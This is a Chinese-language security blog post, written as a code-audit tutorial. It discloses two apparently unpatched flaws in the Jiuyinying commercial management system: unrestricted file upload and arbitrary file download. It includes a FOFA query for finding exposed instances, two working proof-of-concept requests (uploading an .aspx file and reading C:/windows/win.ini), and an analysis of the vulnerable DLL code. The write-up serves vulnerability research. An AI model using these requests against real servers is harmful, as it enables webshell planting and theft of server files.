#  [跟着静师傅学代码审计]九垠赢商业管理系统0day-文件上传和任意文件下载  
原创 静师傅  安静安全   2026-01-14 08:14  
  
点击上方「蓝字」，关注我们  
  
  
审计过程  
  
FOFA:  
  
app="九垠软件-九垠赢"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5XHSw3ZFKffNUPibOBtRb5GcI5hxnAmM1rVWBpuibWsT6DjneQ5SOFkD0Q/640?wx_fmt=png&from=appmsg "")  
  
文件上传POC:  
```
POST /uploader.ashx HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 725

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="fileList"; filename="test.aspx"
Content-Type: text/plain

test
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```  
  
uploader.ashx对应DLL为  
WRM.Web.User.dll  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5X2vyhMMPrtAWv22ZThMscXGMIMvibKaFWSrA2pOFjQMKiaY06omRPY7pg/640?wx_fmt=png&from=appmsg "")  
  
分析uploader可以看到HTTP请求中获取名为"fileList"的文件，然后将其保存到服务器的"Upload"目录下，没有任何后缀限制。通过Write写入文件并返回上传文件的完整路径。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5XEBgF1tnt0iaMLpcOZ9SGyO8GtybMgLeVzLyDISLiaTwPgB0Oic2EiaIJibg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5XKf7JfFeXFsiaKCHCoTlZmurMicO0g8zG1zb67Uj0JZ9Z3iafnbJo5VTxg/640?wx_fmt=png&from=appmsg "")  
  
任意文件下载POC:  
```
http://IP:PORT/System/Common.ashx?type=download&file=file:///C:/windows/win.ini
```  
  
Common.ashx对应DLL为  
WRM.Web.Development.dll  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5XlQ2xP9iaKdy703vKulzfRz0gnA2sGvGOohxqY0tPOZEKETCGt4Ktn3A/640?wx_fmt=png&from=appmsg "")  
  
位于  
WRM.Web.Development下的_Common进行分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5XriclOkBdLl9HftqN8VY2H0wlE93BAoMuocaibKiaONEh5VvMjOMANwyow/640?wx_fmt=png&from=appmsg "")  
  
ProcessRequest方法下有多个case选择，参数为type  
  
当type为download时，跟进函数DownloadFile  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5XLXXvZzUc4WLmGOiaicicr6SKia9ZM4bviao6RgBbaGwJaMUcDUmpwnnMniaQ/640?wx_fmt=png&from=appmsg "")  
  
1.方法从HttpContext中获取名为"file"的参数。  
  
2.将参数按'/'分割，取最后一部分作为文件名。  
  
3.使用WebClient下载该参数指定的文件（服务器本地路径）。  
  
4.将下载的文件以附件形式返回给客户端。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5Xh1XBe1LibArJpN4icleBw9Zz33R9K6icIB6Bsfk8SEtJNSNjLlgNVeQNw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDe1bD0G9iblXAb5hH5OAHAAicvnibOm3C1CGGul4XIHEJfungN7ryIQcSs7dprAcXum4H/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDeDyJCic3PBhyv7VWjySrxQ6szbr5ibswrXU6RtwBZx6icEr0BsbEJLlrOyVt4cd2iazH2/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDedrlavhAFia3SLzjuMj7ZkzCiacCsL5LiaqpZFGRLY8jKBleFSE4e098PRLzVpxNRZt6/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDeHBCRKo0JAfh5Qe0rqN55rb8LC6w9MXy0WtRyc4MfmorJh9RSKmXosxPPib8TISYnr/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDeG6UMdwgrZHG0XPaBdnXXZeuMHPM15jyJwJFIdcH8sKoZz3e2CNh1zsFccMxgvicKM/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5Xh4LZfRYjYy6Hl9weujVIMAkvBYHJb7RGbpicLBIV2I9HS1rvAypOXjA/640?wx_fmt=png&from=appmsg "")  
  
# 往期文章推荐  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDeI6cUZYBtdJ3wjjQROjzERlPQ0aGK6pO42Eq0oAF6QypXCzrgboqCThJpianwv6qRs/640?wx_fmt=svg&from=appmsg "")  
  
[[零日全网首发!]腾达路由器命令注入](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494213&idx=1&sn=0a5209cc9b6b591f53a4956d91893cff&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDet4Ws9J8Iibv2ZNSDJbBMspAJQ1zWibqkQhiadXT2iahmfsNvgA8OicmXuaOSRuf9HuYibP/640?wx_fmt=svg&from=appmsg "")  
  
[[代码审计]蓝凌EIS存在多个后台文件上传0day](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494367&idx=1&sn=5a319d6771ebf687b220b8664de8cd47&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDeI6cUZYBtdJ3wjjQROjzERlPQ0aGK6pO42Eq0oAF6QypXCzrgboqCThJpianwv6qRs/640?wx_fmt=svg&from=appmsg "")  
  
[[安全研究篇]利用.search-ms泄露NTLM哈希](https://mp.weixin.qq.com/s?__biz=MzkyNDI2NjQzNg==&mid=2247494451&idx=1&sn=6d729276abe64d138ba42bdea29bbe94&scene=21#wechat_redirect)  
  
  
###### 交流群：安静安全  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDeR74RkU8kU2DtQNic9cN9jn7PG0KPlHEL6Ldg4wOWcN6TsLGJ5sSViaBFZTOhd5TSf6/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDe7GKMfjYLzUVic6zRK1doDqObhnrqlXibaVD9yst4ickrTFN8ibSm0Jjt9yy8I8S4OqTu/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8pEp2WK8K18ZXQ9t2Lib6E5XeSAWA0hJ1ghBV3JI4dayIgibDrTjcgibudayShqHTeHdIaF6FbjyskbQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDeicDJk9pphyBw99d1QsKSgWBPLTkiaJ96KngicIWp7h7kGEBuh0MXapfj3P2tVrlRqfS/640?wx_fmt=svg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9Kicicr7eR33NyC3PuFXPeQDeDOPJN9eqU5qyC3icUUxvUHhLuxd00Rld0rvsaPuYPaficUkBfbeQjtPKGsicbxXPFjY/640?wx_fmt=svg&from=appmsg "")  
  
  
点个「在看」，你最好看  
  
  
